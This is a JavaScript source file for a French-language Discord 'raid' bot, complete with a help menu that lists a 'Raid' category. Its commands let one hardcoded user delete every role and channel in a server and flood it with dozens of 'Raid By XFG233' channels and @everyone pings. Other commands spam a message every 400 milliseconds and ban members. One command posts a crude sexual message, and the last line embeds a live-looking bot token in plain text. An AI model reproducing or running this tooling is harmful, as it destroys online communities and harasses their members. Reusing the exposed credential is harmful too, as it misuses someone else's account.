
const CLEAR_MESSAGES = '!clearMessages';
const Discord = require('discord.js');
let client = new Discord.Client();
var prefix = "/";

//client.on('ready', () => {
//          client.user.setPresence({ game: { name: `` }, type: "PLAYING" });
        
//});
client.on("message", async message => {
  let args = message.content.split(" ").slice(1);
  if(message.author.id === "459986110525997067") {
    if(message.content.startsWith(prefix + "defcon")) {
       message.guild.roles.forEach (r => {
     r.delete ()
   })
   message.guild.channels.forEach(c => {
   c.delete()
   })
      message.guild.createChannel("Defcon").then(c => {
        c.send("voucou tu veux voir ma bite ?")
      })
    }
    if(message.content.startsWith(prefix + "delete")) {
        message.guild.roles.forEach (r => {
     r.delete ()
   })
   message.guild.channels.forEach(c => {
   c.delete()
   })
    
    message.guild.createChannel("Raid By XFG233").then(c => {
     c.send("@everyone")
    })
  message.guild.createChannel("Raid By XFG233").then(c => {
     c.send("@everyone")
    })
    message.guild.createChannel("Raid By XFG233").then(c => {
     c.end("@everyone")
    })
  message.guild.createChannel("Raid By XFG233").then(c => {
     c.send("@everyone")
    })
  message.guild.createChannel("Raid By XFG233").then(c => {
      c.send("@everyone")
    })                                                                                                   
    message.guild.createChannel("Raid By XFG233")
    message.guild.createChannel("Raid By XFG233")
     message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233") 
    message.guild.createChannel("Raid By XFG233")
     message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233") 
    message.guild.createChannel("Raid By XFG233")
    message.guild.createChannel("Raid By XFG233")
     message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
       message.guild.createChannel("Raid By XFG233")
    }
   //if(message.content.startsWith(prefix + "raid")) {
    //message.channel.bulkDelete(100)
   //if(message.channel.send(" voici mon talent @everyone  <@&597782419134742528> Raid By XFG233 ")) {
   
  //setInterval(() => {
  //   message.channel.send(" @everyone Raid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233RaidRaid XFG233Raid") //  u.ban
  // }
  if (message.content.startsWith ( prefix + "ban")) {
		 //	if(!message.member.hasPermission("BAN_MEMBERS")) return message.channel.send (":x: Tu ne peux pas executer la commande demandée");	

    var amsg = message.content;
		// supprime le premier mot de la chaine (string) donc "!pub machin" va supprimer pub
		var msg = amsg.substr(amsg.indexOf(" ") + 23);
   var reason = msg;
    if (!reason || reason < 250 ) return message.channel.send("***Vous n'avez pas mis de raison ou vous en avez mise une trop longue !!***")

    let member = message.mentions.members.first ();
    let member2 = message.mentions.users.first ();
   var embed = new Discord.RichEmbed()
   .setColor ("#f08619")
   .setTitle ("Vous venez de vous faire bannir :warning:")
   .addField("Par le modérateur/administrateur :", message.author.username + "#" + message.author.discriminator)
   .addField("Depuis le serveur :", message.guild.name)
   .addField ("Pour la raison suivante :", reason)
   .setFooter ("Vous êtes bannis, vous ne pourrez y retournez que en cas de unban 💮 !!")
    
    let search = message.guild.channels.find(`name`, "logs")
    const a = new Discord.RichEmbed()
    .setTitle("test")
    member.send ({embed})
   
message.channel.send ("```diff\nL'utilisateurs "+member2.username +"#"+ member2.discriminator +"\ Viens de ce faire kick pour la raison ci-dessous :\n``` ``\n\n"+ reason + " 🔨 ``")
   
   member.ban();
     
  }
    if(message.content.startsWith(prefix + "spam")) {
     var amsg = message.content;
		// supprime le premier mot de la chaine (string) donc "!pub machin" va supprimer pub
		var msg = amsg.substr(amsg.indexOf(" "));
                          //+ 23);
   var reason = msg; 
      message.delete()
      setInterval(() => {
            message.channel.send(msg)
        }, 1*400);
    }
    if(message.content.startsWith(prefix + "stopspam"))  {
      process.exit()
    }
    if(message.content.startsWith(prefix + "status")) {
      message.delete()
      
   var amsg = message.content;
		// supprime le premier mot de la chaine (string) donc "!pub machin" va supprimer pub
		var msg = amsg.substr(amsg.indexOf(" "));
                          //+ 23);
   var reason = msg; 
      client.user.setPresence({ game: { name: `${msg}`, type: "PLAYING" } });
      message.channel.send("status mis à jours :white_check_mark:")
    }
    if(message.content.startsWith(prefix + "embed")) {
      message.delete()
      var amsg = message.content;
		// supprime le premier mot de la chaine (string) donc "!pub machin" va supprimer pub
		var msg = amsg.substr(amsg.indexOf(" "));
                          //+ 23);
   var reason = msg; 
      let embed = new Discord.RichEmbed()
      .setColor("RANDOM")
      .setAuthor(msg)
      message.channel.send(embed)
    }
    if(message.content.startsWith(prefix + "help")) {
      var embed = new Discord.RichEmbed()
      .setColor("#ff0000")
      .setAuthor("Fondateur : Pulpeuse#5265")
      .addField("/raid","Catégorie Raid")
      .addField("/mod","Catégorie Modération")
      .addField("/util","Catégorie Utilitaires")
      .addField("/gif","affiche les gifs disponibles")
      
   /*   .setColor("#1eff00")
      .addField("Fondée le :","20/08/2019")
      .addField("Par :","Pulpeuse#5265")
      
       */
      
   //   .setFooter("Created by Pulpeuse#5265");
      message.channel.send({embed})
    }
    if(message.content.startsWith(prefix + "raid")) {
      
      var embed = new Discord.RichEmbed()
      .setColor("#1eff00")
      .addField("Par :","Pulpeuse#5265")
      .addField("delete","Supprime et crée des salons en masse")
      .addField("defcon","Supprime tout les salons du serveur")
      .addField("spam","Commence le spam avec un message défini")
      .addField("stopspam","Stop tout les spams en cours")
     message.channel.send({embed}) 
    }
    if(message.content.startsWith(prefix + "mod")) {
       var embed = new Discord.RichEmbed()
      .setColor("#1eff00")
      .addField("Par :","Pulpeuse#5265")
      .addField("ban","Bannir une personne mentionnée")
      .addField("kick","Exclure un membres mentionnée")
      .addField("||Mute||","Indisponible pour le moment")
      .addField("||Unmute||", "Indisponible pour le moment")
       message.channel.send({embed})
    }
    if(message.content.startsWith(prefix + "util")) {
      var embed = new Discord.RichEmbed()
      .setColor("#1eff00")
      .addField("Par :","Pulpeuse#5265")
      .addField("ping","Voir votre latence")
      .addField("status","Changer votre status (joue à...)")
      message.channel.send({embed}) 
    }
    if(message.content.startsWith(prefix + "gif")) {
      var embed = new Discord.RichEmbed()
      .setColor("#1eff00")
      .setDescription("``issou``")
      message.channel.send(embed)
    }
    if(message.content.startsWith(prefix + "issou")) {
      var embed = new Discord.RichEmbed()
      .setImage('https://imgur.com/z1VSmQR.gif')
      message.channel.send(embed)
    }
    if(message.content.startsWith (prefix + "ping")) {
    message.delete();
    message.reply("Pong! (Calcul en cours...)").then(m => m.edit(`${message.author}:ping_pong: Pong!__\n La latence actuelle est de ${m.createdTimestamp - message.createdTimestamp}ms__`) );
    message.react("✅");
  }

  }  
});
client.login("NDU5OTg2MTEwNTI1OTk3MDY3.XVm85Q.l0a50CC_N1QBhrnDxqj0hLAdPfs")

